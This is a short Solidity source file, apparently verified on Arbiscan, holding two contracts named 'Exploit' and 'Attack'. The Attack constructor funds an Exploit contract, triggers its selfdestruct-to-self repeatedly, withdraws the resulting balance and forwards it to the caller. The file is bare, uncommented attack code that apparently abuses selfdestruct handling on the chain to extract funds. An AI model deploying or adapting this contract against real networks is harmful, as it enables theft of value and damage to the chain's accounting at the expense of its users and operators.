/**
 *Submitted for verification at Arbiscan on 2022-11-17
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

contract Exploit {
    constructor() payable {}

    function destroy() public {
        selfdestruct(payable(address(this)));
    }

    function take() public {
        msg.sender.transfer(address(this).balance);
    }
}

contract Attack {
    constructor(uint count) payable {
        Exploit exploit = new Exploit{value: msg.value}();
        for (; count != 0; --count)
            exploit.destroy();
        exploit.take();
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {}
}